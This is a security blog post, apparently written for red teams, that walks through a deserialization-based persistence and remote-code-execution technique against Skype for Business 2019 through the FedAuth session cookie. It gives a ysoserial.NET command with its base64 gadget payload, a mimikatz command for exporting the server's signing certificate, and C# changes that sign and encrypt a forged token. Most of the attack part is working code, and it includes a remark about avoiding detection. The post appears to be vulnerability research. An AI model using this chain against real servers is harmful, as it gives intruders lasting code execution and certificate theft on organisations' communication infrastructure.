---
layout: post
title:  "Skype for Business Audit Part 1 - SKYPErsistence"
date:   2022-09-22 23:00:00 +0200
categories: vulns4free
---
In this blog post I'll introduce the first of two findings affecting the latest patched version of **Skype for Business 2019**.
Here, we talk about a tool for *Red Teams* helping to achieve **persistence** on a Skype server
with help of a (hopefully) new method.

By the way, setting up Skype for Business with a correspondig Active Directory (AD) environment etc.
can be pretty exhausting. Our Skype machine is named `SKYPE01` being part of the `CONTOSO.COM` AD.

Looking at web applications based on .NET, a good way to start is looking at the *IIS Manager* `InetMgr.exe`.
The first thing to realize, there are a lot of *Application Pools* available on a Skype instance.
Also, one might quickly spot that there's a distinction between "External and Internal Website" application(s) path(s).

![InetMgr](/assets/images/skypethings/skype_inetmgr.png)

Since we're primarily interested in paths accessible from the "external world", namely the internet, we usually focus on them first.
For this specific attack, we concentrate on the functions served on `/PassiveAuth`  which are part of the App Pool `LyncExtSignin` (and `LyncIntSignin` for internal access).
On our installation, the corresponding files are located at `C:\Program Files\Skype for Business Server 2019\Web Components\PassiveAuth\Ext`. Enumerating the file system reveals several `.aspx` files such as `PassiveAuth.aspx`,
corresponding DLLs in the `bin/` directory and of course the `Web.config`.
Keep in mind that you've to browse the endpoints first to find all the .NET assemblies/modules in your favorite .NET debugger
(mine: [dnSpy](https://github.com/dnSpy/dnSpy)) when attaching the process.

Let's start with browsing to `https://skype01.contoso.com/PassiveAuth/`, attach the proper IIS worker process (remind the App Pool name?)
and load all modules into our tool.
Back to `Web.config`, HTTP modules are always of special interest to us, because according to the ASP .NET workflow these are
triggered before any authentication/authorization checks occur (I know something something "order"). Basically, these are often used to do exactly this in advance
to protect the subsequent processors.

```xml
  <system.webServer>
    <modules>
      <add name="OCSAuthHelperModule" />
      <add name="OCSAuthModule" type="Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSAuthModule, Microsoft.Rtc.Server.WebInfrastructure, Version=7.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <add name="WSFederationAuthenticationModule" type="Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSWSFederationAuthenticationModule, Microsoft.Rtc.Server.WebInfrastructure, Version=7.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" preCondition="managedHandler" />
      <add name="SessionAuthenticationModule" type="Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSSessionAuthenticationModule, Microsoft.Rtc.Server.WebInfrastructure, Version=7.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" preCondition="managedHandler" />
    </modules>
```

The module `SessionAuthenticationModule` implemented in `Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSSessionAuthenticationModule` stands out compared to other `Web.config` file content of other endpoints, so we look into it in more detail.

The method `InitializeModule(HttpApplication context)` is an overriden method with the following relevant content.

```csharp
protected override void InitializeModule(HttpApplication context)
{
	if (OCSAuthModule.PassiveAuthMode == PassiveAuthMode.WifSession)
	{
		if (this.loadedAsModule)
		{
			base.InitializeModule(context);
		}
		else
		{
			this.InitializePropertiesFromConfiguration();
		}
        ...
```

To reach these calls inside the if statement, the expression `OCSAuthModule.PassiveAuthMode == PassiveAuthMode.WifSession` has to evaluate to `true` which was indeed *not the case* for my setup. After googling a bit, I figured out that this should be the
case in a more complex environment taking into accout "Passive Auth" with Active Directory Federation Services [(ADFS) with e.g. Multi-Factor Authentication](https://learn.microsoft.com/en-us/skypeforbusiness/manage/authentication/configure-two-factor). I'm not sure how common these configurations are to be honest. Since life is short, I chose the "lazy approach" (you could have expected this if you read my other blog posts)
and modified the assembly accordingly. *dnSpy* already provides the function to edit C# classes, compile and store them for you. Of course, this was not the chronological order of my code audit but it'll be a lot more understandable this way: trust me.

So, our new `Microsoft.Rtc.Server.WebInfrastructure.dll` has to find its way into the Global Assembly Cache (GAC) then.
Several ways to do this I guess, but here is what I did:

* Call the Skype CmdLet `Stop-CsWindowsService` (`w3wp.exe` still there blocking the DLL? Yes!)
* Call `iisreset.exe /stop`
* Save the original DLL and copy the modified one into the GAC
* Call `iisreset.exe /start` and `Start-CsWindowsService` accordingly

Back to the code branching into the newly available code path: `this.loadedAsModule` evaluates to `true` anyways
calling the `base.InitializeModule(context)`. We land in the super class `System.IdentityModel.Services.SessionAuthenticationModule`.

```csharp
protected override void InitializeModule(HttpApplication context)
{
		if (context != null)
		{
		context.AuthenticateRequest += this.OnAuthenticateRequest; //[1]
		context.PostAuthenticateRequest += this.OnPostAuthenticateRequest;
		}
}
```

Hitting *[1]* `OnAuthenticateRequest(object sender, EventArgs eventArgs)`, the first lines of the method

```csharp
HttpApplication httpApplication = (HttpApplication)sender;
HttpRequest request = HttpContext.Current.Request;
SessionSecurityToken sessionSecurityToken = null;
if (!this.TryReadSessionTokenFromCookie(out sessionSecurityToken) && string.Equals(request.HttpMethod, "GET", StringComparison.OrdinalIgnoreCase)) //[2]
{
			string absoluteUri = request.Url.AbsoluteUri;
			string text = SessionAuthenticationModule.MatchCookiePath(absoluteUri);
			if (!StringComparer.Ordinal.Equals(absoluteUri, text))
			{
			httpApplication.Response.Redirect(text, false);
			httpApplication.CompleteRequest();
			}
}
...
```

bring us to *[2]* calling the `TryReadSessionTokenFromCookie` method. Reading a Cookie usually means *user-controlled* which is good!

```csharp
public bool TryReadSessionTokenFromCookie(out SessionSecurityToken sessionToken)
{
		byte[] array = this.CookieHandler.Read(); //[3]
		if (array == null)
		{
		sessionToken = null;
		return false;
		}
		sessionToken = this.ReadSessionTokenFromCookie(array); //[4]
		...
```

At *[3]* the Cookie content gets stored in an array and further processing occurs at *[4]*. The expected Cookie name of the `CookieHandler` comes from `private string _name = "FedAuth"` (keep this in mind!). Following the code path
into `ReadSessionTokenFromCookie(byte[] sessionCookie)`, we get

```csharp
public SessionSecurityToken ReadSessionTokenFromCookie(byte[] sessionCookie)
{
		if (TD.SessionCookieReadingStartedIsEnabled())
		{
		TD.SessionCookieReadingStarted(this.EventTraceActivity);
		}
		SessionSecurityTokenHandler sessionSecurityTokenHandler = base.FederationConfiguration.IdentityConfiguration. //[5]
		SecurityTokenHandlers[typeof(SessionSecurityToken)] as SessionSecurityTokenHandler;
		...
```

with a new variable of type `SessionSecurityTokenHandler` *[5]*. This key word may already remind you of something familiar but first let's
go through some more code.

The `sessionCookie` is read and processed in a sequence of if-else branches.

```csharp
...
SecurityContextKeyIdentifierClause keyId = this.GetKeyId(sessionCookie);
SecurityToken securityToken = null;
bool flag = false;
if (keyId != null)
{
			if (sessionSecurityTokenResolver.TryResolveToken(keyId, out securityToken)) //[6]
			{
			return securityToken as SessionSecurityToken;
			}
			flag = true;
}
if (flag)
{
			securityToken = sessionSecurityTokenHandler.ReadToken(sessionCookie, EmptySecurityTokenResolver.Instance);
}
else
{
			securityToken = sessionSecurityTokenHandler.ReadToken(sessionCookie, sessionSecurityTokenResolver); //[7]
}
...
```

If `this.GetKeyId(sessionCookie)` *[6]* evaluate to `true`, `flag` will still equal `false` and therefore the last `else` branch becomes relevant *[7]*. This might be different depending on the "state" but it doesn't really matter if you look a bit closer to the branching.
Then calling `ReadToken(byte[] token, SecurityTokenResolver tokenResolver)` flows into `ReadToken(XmlReader reader, SecurityTokenResolver tokenResolver)` being part of `System.IdentityModel.Tokens.SessionSecurityTokenHandler`.

Looking at this method in more detail

```csharp
		public override SecurityToken ReadToken(XmlReader reader, SecurityTokenResolver tokenResolver)
		{
			if (reader == null)
			{
				throw DiagnosticUtility.ExceptionUtility.ThrowHelperArgumentNull("reader");
			}
			if (tokenResolver == null)
			{
				throw DiagnosticUtility.ExceptionUtility.ThrowHelperArgumentNull("tokenResolver");
			}
			UniqueId uniqueId = null;
			UniqueId uniqueId2 = null;
			SecurityToken securityToken = null;
			SessionDictionary instance = SessionDictionary.Instance;
			XmlDictionaryReader xmlDictionaryReader = XmlDictionaryReader.CreateDictionaryReader(reader);
			...
				else
				{
					byte[] array = xmlDictionaryReader.ReadElementContentAsBase64(); //[8]
					if (array == null)
					{
						throw DiagnosticUtility.ExceptionUtility.ThrowHelperError(new SecurityTokenException(SR.GetString("ID4237")));
					}
					byte[] buffer = this.ApplyTransforms(array, false); //[9]
					using (MemoryStream memoryStream = new MemoryStream(buffer))
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						securityToken = (binaryFormatter.Deserialize(memoryStream) as SecurityToken); //[10]
					}
			...
```

shows that different parts of this *SecurityToken* form an XML document, now being taken apart step by step for verification.
At *[8]* parts are decoded from a Base64 representation, several **transformations** are applied at *[9]* and finally
a **BinaryFormatter.Deserialize** call is made at *[10]*.

Now, it's time to remember the [ysoserial.NET](https://github.com/pwntester/ysoserial.net) tool and realize, there is a plugin implemented:

> SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)

Indeed, this token implementation is known to be a BinaryFormatter Bridge Gadget. Time to download ysoserial.NET to create
a `SessionSecurityTokenHandler` payload. You should also inspect the Base64 decoded form of this to understand the code explained above.

```
ysoserial.exe -p SessionSecurityTokenHandler -c mspaint -o base64
PFNlY3VyaXR5Q29udGV4dFRva2VuIHhtbG5zPSdodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzAyL3NjJz4NCgk8SWRlbnRpZmllciB4bWxucz0naHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wMi9zYyc+DQoJCXVybjp1bmlxdWUtaWQ6c2VjdXJpdHljb250ZXh0OjENCgk8L0lkZW50aWZpZXI+DQoJPENvb2tpZSB4bWxucz0naHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA2LzA1L3NlY3VyaXR5Jz5BUUFBQU5DTW5kOEJGZEVSakhvQXdFL0NsK3NCQUFBQXNOMEhQbEJaV0V5V1NEa3RjUUpxMkFBQUFBQUNBQUFBQUFBRFpnQUF3QUFBQUJBQUFBQ2x4UEtNZWtuUWRmeTdsUy9LR1lPUUFBQUFBQVNBQUFDZ0FBQUFFQUFBQUdlUzk1cnUrODIraEgyUnM3VXVpQy93QVFBQVR1eGpvMllGTFNIOG95eldFWFdsa1VudXNCVEJWbSs2aW50ZTQ5VGpnRTBiVk0yRW0yWEw4NVVPN3o2Ym45b2JseERLbjZLSU5HS0NQZWV2U3dJcjJVUUUwR0YvT3dvYytibVljcDFiOExSbEdBWEh2K3lRaEpXUXh1aG1TaWM0WFVZLzdiSE13VzlHcnNFekFkemtjU3BSY05FVUllTitXOFRHWGFiTkl2bTZ5MUl4ZTBUUDh1eUFGK29NMnprU1RSMXM0VjB6djJkNVNGSzNoMFZGSUhQUHYwdDZEemRQT3RIOExnNGxTb2NBRm9YcDdpaWljaFdtWC9lY0U4M1c2RlJ0bUp0NkZCSkFhT3R0MFRidkRCeGdFK3l3WlBWL2E4cTlKRkYvSXVpTTVCd1g4YTRyaFd0STVyZG9KZzZUVVRQQjdkU0M1VVUxTndNeVNld0o1RzBGNnVaV1ViTFJGU2laZEptOHFQMlA2R3JlN05rbWRzejF2MVpUVk5ScTJyUm9FSTNrODFnaUVwdXNvMUlpbmtjZjVqRjBqS2x6OUhCWGlVRko5ZndmSU5NazE5T292TWU4WGdMZFMvZFVLeVdUeXNhemFTZDMrM0VhZ2pudGhRUzFCNFc1YUhNZXVTcE11R0pSMnpJRzZFendITnVWbFo2UzIyTi9OeHRJSmdBUVZ3cWVmL2Y3OVNOMkdKTDArVTlXbHlnVEwxRmVwUnVGUFhOU3BFcU5ONmgwMGNPVFpuamVsTzNBak1DQUovNmhEaU0ycEJEYURrZVNzRm9LM1FpUVpOL21GY1FWNmpiUi93Y1dVN1ZRZzQwMWxrcWcwY3BxQXYvWDh6c0NvanJ1WlVjSlNCdVFmUTNEeDZ4RndCUUFBQUNMYi9IM1lISi85VTFqR0hZN3lZWlRzZTZ0OUE9PTwvQ29va2llPg0KPC9TZWN1cml0eUNvbnRleHRUb2tlbj4=
```

Send the request

![Failed Request](/assets/images/skypethings/skype_request1.png)

and hit the breakpoint

![Hit Breakpoint](/assets/images/skypethings/skype_bp1.png)

and get an exception.

```
$exception	{System.Security.Cryptography.CryptographicException: ID1014: Signature invalid, may have been tampered
in System.IdentityModel.RsaSignatureCookieTransform.Decode(Byte[] encoded)
in System.IdentityModel.Tokens.SessionSecurityTokenHandler.ApplyTransforms(Byte[] cookie, Boolean outbound)
in System.IdentityModel.Tokens.SessionSecurityTokenHandler.ReadToken(XmlReader reader, SecurityTokenResolver tokenResolver)
in System.IdentityModel.Tokens.SessionSecurityTokenHandler.ReadToken(Byte[] token, SecurityTokenResolver tokenResolver)
in System.IdentityModel.Services.SessionAuthenticationModule.ReadSessionTokenFromCookie(Byte[] sessionCookie)
in System.IdentityModel.Services.SessionAuthenticationModule.TryReadSessionTokenFromCookie(SessionSecurityToken& sessionToken)
in System.IdentityModel.Services.SessionAuthenticationModule.OnAuthenticateRequest(Object sender, EventArgs eventArgs)
in System.Web.HttpApplication.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
in System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)
in System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)}	System.Security.Cryptography.CryptographicException
```

Would have been to easy, right? So different transformations are applied, as we already mentioned above. What are these transformations then? Let's go back to the very beginning at `Microsoft.Rtc.Internal.WebServicesAuthFramework.OCSSessionAuthenticationModule`.
Remember this method? This time we look at the below part of the method.

```csharp
		protected override void InitializeModule(HttpApplication context)
		{
			if (OCSAuthModule.PassiveAuthMode == PassiveAuthMode.WifSession)
			{
				...
				X509Certificate2 signingCert = WebTicketKeyStore.GetSigningCert();
				SessionSecurityTokenHandler handler = new SessionSecurityTokenHandler(new List<CookieTransform>(new CookieTransform[]
				{
					new DeflateCookieTransform(), //[11]
					new RsaEncryptionCookieTransform(signingCert), //[12]
					new RsaSignatureCookieTransform(signingCert) //[13]
				}).AsReadOnly());
				...
```

At *[11]*, *[12]* and *[13]* the transformations are listed in order. `signingCert = WebTicketKeyStore.GetSigningCert()` also
gives us an understanding of the required **Certificate** needed to *sign and encrypt* our token properly. We need the signing certificate of the SKYPE service itself! We probably found a way to get a nice persistence technique on a SKYPE server after a successful compromise. Remember the **Golden SAML** attack for ADFS? This attack could be something similar with a bonus: built-in Remote Code Execution (**RCE**).

But first we've to build such a token properly. Assuming you compromised the SKYPE server, exporting the certificates could be done with **mimikatz**: `crypto::certificates /systemstore:local_machine /store:my /export`. As a Red Team professional, of course you have to do some extra work to not get caught immediately :-P.

Here are the ysoserial.NET *SessionSecurityTokenHandler plugin* modifications needed to generate a proper payload.

```csharp
...
byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();

X509Certificate2 x509 = new X509Certificate2();
byte[] rawData = ReadFile(@"C:\WHEREEVERYOURCERTISSTORED\CERT.pfx");
x509.Import(rawData, "mimikatz", X509KeyStorageFlags.Exportable);
RsaEncryptionCookieTransform myProtectedDataCookieTransform = new RsaEncryptionCookieTransform(x509);
RsaSignatureCookieTransform myProtectedDataCookieTransform2 = new RsaSignatureCookieTransform(x509);
//ProtectedDataCookieTransform myProtectedDataCookieTransform = new ProtectedDataCookieTransform(); <-- not needed anymore
byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
byte[] signedEncoded = myProtectedDataCookieTransform2.Encode(encryptedEncoded);
payload = String.Format(payload, Convert.ToBase64String(signedEncoded));
...
```

Basically, the exported certificate is read and the missing transformations added to the plugin accordingly. That's it!

![Remote Code Execution](/assets/images/skypethings/skype_rce.png)

This works on the Internal **and** External worker processes.
Have fun and stay tuned for the next blog post **Skype for Business Audit Part 2 - SKYPErimeterleak**.